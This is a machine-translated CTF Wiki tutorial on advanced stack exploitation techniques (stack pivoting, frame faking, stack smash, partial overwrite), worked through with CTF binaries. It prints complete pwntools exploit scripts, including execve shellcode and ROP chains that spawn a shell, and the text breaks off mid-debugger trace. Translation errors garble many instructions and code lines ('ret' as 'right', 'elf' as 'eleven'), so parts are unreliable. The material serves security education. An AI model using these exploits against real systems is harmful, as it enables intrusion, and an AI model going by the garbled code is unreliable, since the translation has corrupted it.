[EN](./fancy-rop.md) | [ZH](./fancy-rop-zh.md)
#花式溢溢技巧


## stack pivoting



### Principle


Stack pivoting, as it describes, the trick is to hijack the stack pointer to the memory that the attacker can control, and then ROP at the appropriate location. In general, we may need to use stack pivoting in the following situations.


- The number of bytes that can be controlled by the stack overflow is small, making it difficult to construct a long ROP chain
- PIE protection is enabled, the stack address is unknown, we can hijack the stack to a known area.
- Other vulnerabilities are difficult to exploit, we need to convert, for example, hijacking the stack to the heap space, writing rop on the heap and making heap exploits


In addition, there are several requirements for using socket pivoting.


- You can control the flow of program execution.


- You can control the sp pointer. In general, the control stack pointer will use ROP, and the common control stack pointers are usually gadgets.


`` `asm
pop rsp/esp

```



Of course, there will be some other postures. For example, gadgets in libc_csu_init, we can get the control rsp pointer by offset. The above is normal, the bottom is offset.


`` `asm
gef➤  x/7i 0x000000000040061a

0x40061a <__libc_csu_init+90>:	pop    rbx

0x40061b <__libc_csu_init+91>:	pop    rbp

0x40061c <__libc_csu_init+92>:	pop    r12

0x40061e <__libc_csu_init+94>:	pop    r13

0x400620 <__libc_csu_init+96>:	pop    r14

0x400622 <__libc_csu_init+98>:	pop    r15

0x400624 &lt;__ libc_csu_init + 100&gt;: right
gef➤  x/7i 0x000000000040061d

0x40061d <__libc_csu_init+93>:	pop    rsp

0x40061e <__libc_csu_init+94>:	pop    r13

0x400620 <__libc_csu_init+96>:	pop    r14

0x400622 <__libc_csu_init+98>:	pop    r15

0x400624 &lt;__ libc_csu_init + 100&gt;: right
```



In addition, there are more advanced fake frames.




- There is memory that can control the content, generally as follows
- bss segment. Since the process allocates memory by page, the memory allocated to the bss segment is at least one page (4k, 0x1000) in size. However, the contents of the general bss section do not use so much space, and the memory pages allocated by the bss section have read and write permissions.
- heap. But this requires us to be able to reveal the heap address.


###example


#### Example 1


Here we take [X-CTF Quals 2016 - b0verfl0w] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-% 20b0verfl0w) is introduced as an example. First, check the security of the program, as follows


```shell

➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX disabled

    PIE:      No PIE (0x8048000)

    RWX:      Has RWX segments

```



It can be seen that the source program is 32-bit and NX protection is not enabled. Let&#39;s look for the vulnerability of the program.


```C

signed int vul()

{

  char s; // [sp+18h] [bp-20h]@1



  puts("\n======================");

  puts("\nWelcome to X-CTF 2016!");

  puts("\n======================");

  puts("What's your name?");

  fflush(stdout);

  fgets(&s, 50, stdin);

  printf("Hello %s.", &s);

  fflush(stdout);

  return 1;

}

```



As you can see, there is a stack overflow vulnerability in the source program. But the only bytes that can overflow are only 50-0x20-4=14 bytes, so it is difficult to implement some better ROPs. Here we consider stack pivoting. Since the program itself does not have stack protection turned on, we can lay out shellcode on the stack and execute it. Basic use ideas are as follows


- Layout shellcode with stack overflow
- Control eip to point to shellcode


The first step is still relatively easy to read directly, but since the program itself will open ASLR protection, it is difficult to directly know the address of the shellcode. But the relative offset on the stack is fixed, so we can use the stack overflow to operate on the esp to point to the shellcode and directly control the program to jump to the esp. The following is to find the control program to jump to the gadgets at the esp.


```shell

➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         

Gadgets information

============================================================

0x08048504 : jmp esp

0x0804836a: right
0x0804847e: right 0xeac1


Unique gadgets found: 3

```



Here we find that there is a gadget that can jump directly to esp. Then we can lay out the payload as follows


```text

shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp

```



Then the last part of our payload changes how to set esp, you can know


- size(shellcode+padding)=0x20

- size(fake ebp)=0x4

- size(0x08048504)=0x4



So the last step we need to execute is


`` `asm
sub esp,0x28

jmp esp

```



So the last exp is as follows


```python

from pwn import *

sh = process('./b0verfl0w')



shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"

shellcode_x86 += "\x0b\xcd\x80"



sub_esp_jmp = asm('sub esp, 0x28;jmp esp')

jmp_esp = 0x08048504

payload = shellcode_x86 + (

    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp

sh.sendline(payload)

sh.interactive()

```



#### Example 2 - Transfer heap


Wait.


### Title


- [EkoPartyCTF 2016 fuckzing-exploit-200](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200)



## frame faking



As the name suggests, this technique constructs a fake stack frame to control the execution flow of the program.


### Principle


In a nutshell, the stack overflow we talked about before is nothing more than two ways.


- Control program EIP
- Control program EBP


It ends up being the execution flow of the control program. In frame faking, the trick we use is to control both EBP and EIP, so that we control the execution flow of the program and also change the position of the stack frame. Generally its payload is as follows


```

buffer padding|fake ebp|leave ret addr|

```



That is, we use stack overflow to construct the stack as above. Here we mainly talk about the next two parts


- The return address of the function is overwritten by us to execute the address of the leave ret, which indicates that the function will perform a leave ret again after it has successfully executed its own leave ret.
- where fake ebp is the base address of the stack frame we constructed. Note that this is an address. In general, we construct a fake stack frame as follows


```

fake ebp

|

v
ebp2|target function addr|leave ret addr|arg1|arg2

```



Here our fake ebp points to ebp2, which is the address where ebp2 is located. Generally speaking, this is all readable content that we can control.


**The following assembly syntax is the intel syntax. **


Before we introduce the basic control process, we still need to talk about the basic operation of the entry and exit points of the function.


Entry point


```

Push ebp # push ebp
Mov ebp, esp # assign the value of esp to ebp
```



Exit point


```

leave

Ret #pop eip, pop the top element of the stack as the next execution address of the program
```



Where the leave command is equivalent


```

Mov esp, ebp # assign the value of ebp to esp
Pop ebp # pop ebp
```



Let&#39;s take a closer look at the basic control process.


1. When a program with a stack overflow performs leave, it is divided into two steps.


- mov esp, ebp , which will also point esp to the ebp base address of the current stack overflow vulnerability.
- pop ebp, which assigns the value of fake ebp stored in the stack to ebp. That is, after executing the instruction, ebp points to ebp2, which is the address where ebp2 is stored.


2. Execute the ret instruction and execute the leave ret instruction again.


3. Execute the leave command, which is divided into two steps


- mov esp, ebp , which points esp to ebp2.
- pop ebp, in which case the content of ebp will be set to the value of ebp2, and esp will point to the target function.


4. Execute the ret instruction, at which time the program will execute the target function and execute it when it is running the program.


- push ebp, which pushes the ebp2 value onto the stack.


- mov ebp, esp, points ebp to the current base address.


The stack structure at this time is as follows


```

ebp

|

v
ebp2 | leave ret addr | arg1 | arg2
```



5. When the program is executed, it will apply for space normally. At the same time, we also arrange the parameters corresponding to the function on the stack, so the program will execute normally.


6. After the program ends, it will execute leave ret addr twice, so if we have the corresponding content arranged at ebp2, then we can always control the execution flow of the program.


It can be seen that in the fake frame, we have a requirement that we have to have a memory that can be written, and we also know the address of this memory, which is similar to stack pivoting.




### 2018 安恒杯over
Take the over one of the An Heng Cup monthly competition in June 2018 as an example. The title can be found in [ctf-challenge] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow Found in /fake_frame/over)


#### File Information
```bash

over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped

[*] '/home/m4x/pwn_repo/others_over/over.over'

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

FOOT: No FOOT
```

64-bit dynamically linked program, without PIE and canary protection, but opened
NX protection

####分析程序
Put it in IDA for analysis
```C

__int64 __fastcall main(__int64 a1, char **a2, char **a3)

{

  setvbuf(stdin, 0LL, 2, 0LL);

  setvbuf(stdout, 0LL, 2, 0LL);

  while ( sub_400676() )

    ;

  return 0LL;

}



int sub_400676()

{

  char buf[80]; // [rsp+0h] [rbp-50h]



  memset(buf, 0, sizeof(buf));

  putchar('>');

  read(0, buf, 96uLL);

  return puts(buf);

}

```

The vulnerability is obvious, read can read 96 bits, but the length of buf is only 80, so it can cover rbp and ret addr but can only cover rbp and ret addr, so it can only be controlled by controlling rbp and ret addr at the same time. Up


#### leak stack

In order to control rbp, we need to know some addresses. We can find that when the input length is 80, since read does not add &#39;\0&#39; to the end of the input, the value of rbp will be printed by puts, so that we can Know the address of all locations on the stack by a fixed offset
```C

Breakpoint 1, 0x00000000004006b9 in ?? ()

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA

───────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────

 RAX  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

 RBX  0x0

 RCX  0x7ff756e9b690 (__read_nocancel+7) ◂— cmp    rax, -0xfff

 RDX  0x60

 RDI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

 RSI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

 R8   0x7ff75715b760 (_IO_stdfile_1_lock) ◂— 0x0

R9 0x7ff757354700 ◂- 0x7ff757354700
 R10  0x37b

 R11  0x246

 R12  0x400580 ◂— xor    ebp, ebp

 R13  0x7ffceaf112b0 ◂— 0x1

 R14  0x0

 R15  0x0

 RBP  0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15

 RSP  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

 RIP  0x4006b9 ◂— call   0x400530

────────────────────────────────────────────────── ─────── [DISASM] ──────────────────────────────────────── ─────────────────
 ► 0x4006b9    call   puts@plt <0x400530>

        s: 0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')



   0x4006be    leave

0x4006bf right


   0x4006c0    push   rbp

   0x4006c1    mov    rbp, rsp

   0x4006c4    sub    rsp, 0x10

0x4006c8 mov dword ptr [rbp - 4], edi
0x4006cb mov qword for [rbp - 0x10], rsi
   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] <0x601060>

0x4006d6 mov ecx, 0
   0x4006db    mov    edx, 2

─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────

00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

... ↓

───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────

 ► f 0           4006b9

   f 1           400715

   f 2     7ff756de02b1 __libc_start_main+241

Breakpoint *0x4006B9

pwndbg> stack 15

00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

... ↓

0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15

0b:0058│                  0x7ffceaf111b8 —▸ 0x400715 ◂— test   eax, eax

0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— './over.over'

0d:0068│                  0x7ffceaf111c8 ◂— 0x100000000

0e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15

pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160

0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)

```



After leaking the stack address, we can control the program flow by controlling rbp as the address on the stack (such as 0x7ffceaf11160) and ret addr as the address of leave ret.


For example, we can fill in the rop chain of the leak libc at 0x7ffceaf11160 + 0x8 and control it back to the `sub_400676` function to leak libc.
​	 

Then on the next use, you can use the rop to execute `system(&quot;/bin/sh&quot;)` or `execve(&quot;/bin/sh&quot;, 0, 0)` to get the shell. This question is because the input is long enough. , we can arrange the use chain of `execve(&quot;/bin/sh&quot;, 0, 0)`, this method is more secure (`system(&quot;/bin/sh&quot;)` may be invalidated due to env destruction) , but because the structure of the stack changes during the process, some key offsets need to be determined by debugging.


#### exp

```python

from pwn import *

context.binary = "./over.over"



def DEBUG(cmd):

    raw_input("DEBUG: ")

    gdb.attach(io, cmd)



io = process("./over.over")

eleven = ELF (&quot;./over.over&quot;)
libc = elf.libc



io.sendafter(">", 'a' * 80)

stack = u64 (io.recvuntil (&quot;x7f&quot;) [- 6:] .light (8, &#39;0&#39;)) - 0x70
success("stack -> {:#x}".format(stack))





#  DEBUG("b *0x4006B9\nc")

io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))

libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']

success("libc.address -> {:#x}".format(libc.address))



pop_rdi_ret = 0x400793
'''

$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop | ret&quot;
0x00000000000f5279 : pop rdx ; pop rsi ; ret

'''

pop_rdx_pop_rsi_ret=libc.address+0xf5279





payload=flat(['22222222', pop_rdi_ret, next(libc.search("/bin/sh")),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym['execve'], (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])



io.sendafter(">", payload)



io.interactive ()
```



In general, this method is not very different from the stack pivot.

### Reference reading


- [http://www.xfocus.net/articles/200602/851.html](http://www.xfocus.net/articles/200602/851.html)

- [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)



## Stack smash



### Principle




After the program is added with canary protection, if the buffer we read overwrites the corresponding value, the program will report an error, and generally we will not care about the error message. The stack smash trick is to use the program that prints this information to get what we want. This is because after the program starts canary protection, if the canary is found to be modified, the program will execute the `__stack_chk_fail` function to print the string pointed to by the argv[0] pointer. Normally, this pointer points to the program name. Its code is as follows


```C

void __attribute__ ((noreturn)) __stack_chk_fail (void)

{

  __fortify_fail ("stack smashing detected");

}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)

{

  /* The loop is added only to keep gcc happy.  */

  while (1)

    __libc_message (2, "*** %s ***: %s terminated\n",

                    msg, __libc_argv[0] ?: "<unknown>");

}

```



So if we use stack overflow to override argv[0] for the address of the string we want to output, then we will output the information we want in the `__fortify_fail` function.


### 32C3 CTF readme



Here, we introduce the 2015 32C3 CTF readme as an example, which is reproduced on jarvisoj.


#### Determining protection


It can be seen that the program is 64-bit, mainly enabling Canary protection and NX protection, as well as FORTIFY protection.


```shell

➜  stacksmashes git:(master) ✗ checksec smashes

    Arch:     amd64-64-little

    RELRO:    No RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)

    FORTIFY:  Enabled

```



####分析程序


Ida look


```c

__int64 sub_4007E0()

{

__int64 v0; // rax @ 1
  __int64 v1; // rbx@2

  int v2; // eax@3

__int64 v4; // [sp + 0h] [bp-128h] @ 1
  __int64 v5; // [sp+108h] [bp-20h]@1



  v5 = *MK_FP(__FS__, 40LL);

  __printf_chk(1LL, (__int64)"Hello!\nWhat's your name? ");

LODWORD (v0) = _IO_gets ((__ int64) &amp; v4);
  if ( !v0 )

LABEL_9:

    _exit(1);

  v1 = 0LL;

  __printf_chk(1LL, (__int64)"Nice to meet you, %s.\nPlease overwrite the flag: ");

  while ( 1 )

  {

    v2 = _IO_getc(stdin);

    if ( v2 == -1 )

      goto LABEL_9;

    if ( v2 == '\n' )

      break;

    byte_600D20[v1++] = v2;

    if ( v1 == ' ' )

      goto LABEL_8;

  }

  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));

LABEL_8:

  puts("Thank you, bye!");

  return *MK_FP(__FS__, 40LL) ^ v5;

}

```



Obviously, the program has a stack overflow in `_IO_gets((__int64)&amp;v4)`;


In addition, the program also prompts to overwrite the flag. And found that the program is very interesting to execute this statement after the while loop


```C

  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));

```



Looking at the contents of the corresponding address, you can find the following content, indicating that the flag of the program is here.




```

.data:0000000000600D20 ; char aPctfHereSTheFl[]

.data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0

```



But if we directly use the stack overflow to output the contents of the address is not feasible, this is because the content we read `byte_600D20[v1++] = v2;` is exactly the block memory, which will directly overwrite it, this We need to use a skill.


- When ELF memory maps, the bss section is mapped twice, so we can use another address for output, which can be found using gdb&#39;s find.


#### Determine the flag address


We download the breakpoint from the memset function and read the corresponding content as follows


`` `asm
gef➤  c

Continuing.

Hello!

What's your name? qqqqqqq

Nice to meet you, qqqqqqq.

Please overwrite the flag: 222222222



Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38

38 ../sysdeps/x86_64/multiarch/memset-avx2.S: There is no such file or directory.
─────────────────────────────────────[ code:i386:x86-64 ]────

   0x7ffff7b7f920 <__memset_chk_avx2+0> cmp    rcx, rdx

   0x7ffff7b7f923 <__memset_chk_avx2+3> jb     0x7ffff7b24110 <__GI___chk_fail>

   0x7ffff7b7f929                  nop    DWORD PTR [rax+0x0]

 → 0x7ffff7b7f930 <__memset_avx2+0> vpxor  xmm0, xmm0, xmm0

   0x7ffff7b7f934 <__memset_avx2+4> vmovd  xmm1, esi

   0x7ffff7b7f938 <__memset_avx2+8> lea    rsi, [rdi+rdx*1]
   0x7ffff7b7f93c <__memset_avx2+12> mov    rax, rdi

───────────────────────────────────────────────────────────────────[ stack ]────

['0x7fffffffda38', 'l8']

8

0x00007fffffffda38│+0x00: 0x0000000000400878  →   mov edi, 0x40094e	 ← $rsp

0x00007fffffffda40│+0x08: 0x0071717171717171 ("qqqqqqq"?)

0x00007fffffffda48│+0x10: 0x0000000000000000

0x00007fffffffda50│+0x18: 0x0000000000000000

0x00007fffffffda58│+0x20: 0x0000000000000000

0x00007fffffffda60│+0x28: 0x0000000000000000

0x00007fffffffda68│+0x30: 0x0000000000000000

0x00007fffffffda70│+0x38: 0x0000000000000000

──────────────────────────────────────────────────────────────────────────────[ trace ]────

[#0] 0x7ffff7b7f930 → Name: __memset_avx2()

[# 1] 0x400878 → mov edi, 0x40094e
──────────────────────────────────────────────────────────────────────────────

gef➤  find 22222

Argument required (expression to compute).

gef➤  find '22222'

No symbol "22222" in current context.

given grip &#39;22222&#39;
[+] Searching '22222' in memory

[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw-

  0x600d20 - 0x600d3f  →   "222222222's the flag on server}" 

[+] In '[heap]'(0x601000-0x622000), permission=rw-

  0x601010 - 0x601019  →   "222222222" 

donated PCTF
[+] Searching 'PCTF' in memory

[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x

  0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" 

```



It can be seen that the 2222 we read has covered the flag at 0x600d20, but we still find the backup of this flag at 0x400d20 in memory, so we can still output it. Here we have determined the address of the flag.


#### Determining the offset


Next, we determine the offset of the string read by argv[0].


First break the breakpoint at the main function entry, as follows


`` `asm
gef➤  b *0x00000000004006D0

Breakpoint 1 at 0x4006d0

gef➤  r

Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes 



Breakpoint 1, 0x00000000004006d0 in ?? ()

 code:i386:x86-64 ]────

     0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>

     0x4006c6 <_IO_gets@plt+6> push   0x9

     0x4006cb <_IO_gets@plt+11> jmp    0x400620

 →   0x4006d0                  sub    rsp, 0x8

0x4006d4 mov rdi, QWORD PTR [rip + 0x200665] # 0x600d40 <stdout>
0x4006db xi, oh
     0x4006dd                  call   0x400660 <setbuf@plt>

──────────────────────────────────────────────────────────────────[ stack ]────

['0x7fffffffdb78', 'l8']

8

0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax	 ← $rsp

0x00007fffffffdb80│+0x08: 0x0000000000000000

0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]"

0x00007fffffffdb90│+0x18: 0x0000000100000000

0x00007fffffffdb98│+0x20: 0x00000000004006d0  →   sub rsp, 0x8

0x00007fffffffdba0│+0x28: 0x0000000000000000

0x00007fffffffdba8│+0x30: 0x48c916d3cf726fe3

0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp

──────────────────────────────────────────────────────────────[ trace ]────

[#0] 0x4006d0 → sub rsp, 0x8

[#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48)

---Type <return> to continue, or q <return> to quit---

[# 2] 0x400717 → holds


```



It can be seen that 0x00007fffffffe00b points to the program name, which is naturally argv[0], so the content we modified is this address. At the same time, the address is kept at 0x00007fffffffdc58, so the address we really need is 0x00007fffffffdc58.


Also, according to the assembly code


`` `asm
.text:00000000004007E0                 push    rbp

.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; "Hello!\nWhat's your name? "

.text:00000000004007E6                 mov     edi, 1

.text:00000000004007EB                 push    rbx

.text:00000000004007EC                 sub     rsp, 118h

.text:00000000004007F3                 mov     rax, fs:28h

.text:00000000004007FC                 mov     [rsp+128h+var_20], rax

.text:0000000000400804                 xor     eax, eax

.text:0000000000400806                 call    ___printf_chk

.text:000000000040080B                 mov     rdi, rsp

.text:000000000040080E                 call    __IO_gets

```



We can make sure that the starting address of the string we read is actually the rsp before calling `__IO_gets`, so we put the breakpoint at the call, as follows


`` `asm
gef➤  b *0x000000000040080E

Breakpoint 2 at 0x40080e

gef➤  c

Continuing.

Hello!

What's your name? 

Breakpoint 2, 0x000000000040080e in ?? ()

──────────────────────────[ code:i386:x86-64 ]────

     0x400804                  xor    eax, eax

     0x400806                  call   0x4006b0 <__printf_chk@plt>

     0x40080b                  mov    rdi, rsp

 →   0x40080e                  call   0x4006c0 <_IO_gets@plt>

   ↳    0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>

        0x4006c6 <_IO_gets@plt+6> push   0x9

        0x4006cb <_IO_gets@plt+11> jmp    0x400620

        0x4006d0                  sub    rsp, 0x8

──────────────────[ stack ]────

['0x7fffffffda40', 'l8']

8

0x00007fffffffda40│+0x00: 0x0000ff0000000000	 ← $rsp, $rdi

0x00007fffffffda48│+0x08: 0x0000000000000000

0x00007fffffffda50│+0x10: 0x0000000000000000

0x00007fffffffda58│+0x18: 0x0000000000000000

0x00007fffffffda60│+0x20: 0x0000000000000000

0x00007fffffffda68│+0x28: 0x0000000000000000

0x00007fffffffda70│+0x30: 0x0000000000000000

0x00007fffffffda78│+0x38: 0x0000000000000000

────────────────────────────────────────────[ trace ]────

[#0] 0x40080e → call 0x4006c0 <_IO_gets@plt>

──────────────────────────────────────────────────────────

gef➤  print $rsp

$1 = (void *) 0x7fffffffda40
```



It can be seen that the value of rsp is 0x7fffffffda40, then the relative offset is


```python

>>> 0x00007fffffffdc58-0x7fffffffda40

536

>>> hex(536)

'0x218'

```



#### Using the program


We construct the application as follows


```python

from pwn import *

context.log_level = 'debug'

smash = ELF('./smashes')

if args['REMOTE']:

    sh = remote('pwn.jarvisoj.com', 9877)

else:

    sh = process('./smashes')

argv_addr = 0x00007fffffffdc58

name_addr = 0x7fffffffda40

flag_addr = 0x600D20

another_flag_addr = 0x400d20

payload = 'a' * (argv_addr - name_addr) + p64(another_flag_addr)

sh.recvuntil('name? ')

sh.sendline(payload)

sh.recvuntil('flag: ')

sh.sendline ( &#39;bb&#39;)
data = sh.recv()

sh.interactive()

```



Here we get the flag directly, there is no online saying that the flag is not available.


### Title
- 2018 Net Ding Cup - guess


## partial overwrite on the stack
Partial overwrite This technique is applicable in many places. Here we use the partial overwrite on the stack as an example to introduce this idea.


We know that after randomization (ASLR, PIE) is turned on, the lower 12-bit page offset is always fixed regardless of the high-order address, which means that if we can change the low-order offset, we can Control the execution flow of the program to some extent, bypassing PIE protection.


### 2018-安恒杯-babypie
Taking the babypie of the Anheng Cup in July 2018 as an example, this kind of utilization technique is analyzed. The binary of the topic is placed in [ctf-challenge] (https://github.com/ctf-wiki/ctf-challenges/tree/ Master/pwn/stackoverflow/partial_overwrite)
#### Determining protection
```bash

babypie: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped

[*] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie'

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      PIE enabled

```

64-bit dynamically linked file with PIE protection and stack overflow protection enabled
####分析程序
Looking at IDA, it is easy to find the vulnerability point. There are obvious stack overflow vulnerabilities in both inputs. It should be noted that before the input, the program clears the stack space, so we cannot pass the print stack. Information comes to the base of leak binary or libc
```C

__int64 sub_960 ()
{

  char buf[40]; // [rsp+0h] [rbp-30h]

  unsigned __int64 v2; // [rsp+28h] [rbp-8h]



  v2 = __readfsqword(0x28u);

  setvbuf(stdin, 0LL, 2, 0LL);

  setvbuf(_bss_start, 0LL, 2, 0LL);

* (_ OWORD *) buf = 0uLL;
* (_ OWORD *) &amp; buf [16] = 0uLL;
  puts("Input your Name:");

  read(0, buf, 0x30uLL);                        // overflow

  printf("Hello %s:\n", buf, *(_QWORD *)buf, *(_QWORD *)&buf[8], *(_QWORD *)&buf[16], *(_QWORD *)&buf[24]);

  read(0, buf, 0x60uLL);                        // overflow

  return 0LL;

}

```



Also found that the program gives a function that can directly get the shell
`` `asm
.text:0000000000000A3E getshell        proc near

.text:0000000000000A3E ; __unwind { .text:0000000000000A3E                 push    rbp

.text:0000000000000A3F                 mov     rbp, rsp

.text:0000000000000A42                 lea     rdi, command    ; "/bin/sh"

.text:0000000000000A49                 call    _system

.text:0000000000000A4E                 nop

.text:0000000000000A4F                 pop     rbp

.text: 0000000000000A50 retn
.text:0000000000000A50 ; } // starts at A3E

.text:0000000000000A50 getshell        endp

```

So we just have to control rip to this function.


#### leak canary

There is an output immediately after the first read, and read does not add \0 to the end of the input, which gives us the opportunity to leak the contents of the stack.


In order to control the return address for the second overflow, we choose leak canary. It can be calculated that the length of the first read is 0x30 - 0x8 + 1 (+ 1 is to cover the value of the lowest bit of canary is non-zero, printf uses % s, when the end of \0 is encountered, when the canary low is over non-zero, canary can be printed by printf)


`` `asm
Breakpoint 1, 0x0000557c8443aa08 in ?? ()

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA

──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────

 RAX  0x0

 RBX  0x0

 RCX  0x7f1898a64690 (__read_nocancel+7) ◂— cmp    rax, -0xfff

 RDX  0x30

 RDI  0x557c8443ab15 ◂— insb   byte ptr [rdi], dx /* 'Hello %s:\n' */

 RSI  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')

 R8   0x7f1898f1d700 ◂— 0x7f1898f1d700

 R9   0x7f1898f1d700 ◂— 0x7f1898f1d700

 R10  0x37b

 R11  0x246

 R12  0x557c8443a830 ◂— xor    ebp, ebp

 R13  0x7ffd97aa0540 ◂— 0x1

 R14  0x0

 R15  0x0

 RBP  0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15

 RSP  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')

 RIP  0x557c8443aa08 ◂— call   0x557c8443a7e0

────────────────────────────────────────────────── ─ [DISASM] ─────────────────────────────────────────────────── ──────
 ► 0x557c8443aa08    call   0x557c8443a7e0



   0x557c8443aa0d    lea    rax, [rbp - 0x30]

   0x557c8443aa11    mov    edx, 0x60

   0x557c8443aa16    mov    rsi, rax
0x557c8443aa19 mov edi, 0
   0x557c8443aa1e    call   0x557c8443a7f0



   0x557c8443aa23    mov    eax, 0

0x557c8443aa28 mov rcx, qword ptr [rbp - 8]
   0x557c8443aa2c    xor    rcx, qword ptr fs:[0x28]

   0x557c8443aa35    je     0x557c8443aa3c



   0x557c8443aa37    call   0x557c8443a7c0

────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────

00:0000│ rsi rsp  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')

... ↓

05:0028│          0x7ffd97aa0438 ◂— 0xb3012605fc402a61

06:0030│ rbp      0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15

07:0038│          0x7ffd97aa0448 —▸ 0x557c8443aa6a ◂— mov    eax, 0

Breakpoint *(0x557c8443a000+0xA08)

pwndbg> canary

$1 = 0

canary : 0xb3012605fc402a00

pwndbg&gt;
```



Canary In the rbp - 0x8 position, it can be seen that the lower bit of the canary has been overwritten to 0x61, so as long as the 7 bits after &#39;a&#39; * (0x30 - 0x8 + 1) are received, plus the lowest bit &#39;\ 0&#39;, we will recover the canary of the program.


#### Override return address
With canary, you can overwrite the return address with the second stack overflow, and control the return address to the getshell function. Let&#39;s first look at the return address when there is no overflow.


`` `asm
0x000055dc43694a1e in ?? ()

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA

──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────

 RAX  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')

 RBX  0x0

 RCX  0x7f206c6696f0 (__write_nocancel+7) ◂— cmp    rax, -0xfff

 RDX  0x60

 RDI  0x0

